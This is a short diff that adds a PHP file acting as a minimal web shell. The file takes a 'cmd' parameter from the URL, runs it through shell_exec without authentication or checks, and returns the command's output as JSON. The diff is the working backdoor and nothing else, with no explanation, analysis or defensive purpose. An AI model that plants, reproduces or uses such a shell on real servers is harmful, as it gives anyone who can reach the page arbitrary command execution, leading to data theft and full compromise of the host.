@@ -1,0 +1,11 @@
+<?php
+header('Content-Type: application/json');
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    $output = shell_exec($cmd);
+    echo json_encode([
+        "cmd" => $cmd,
+        "output" => $output
+    ]);
+}
+?>
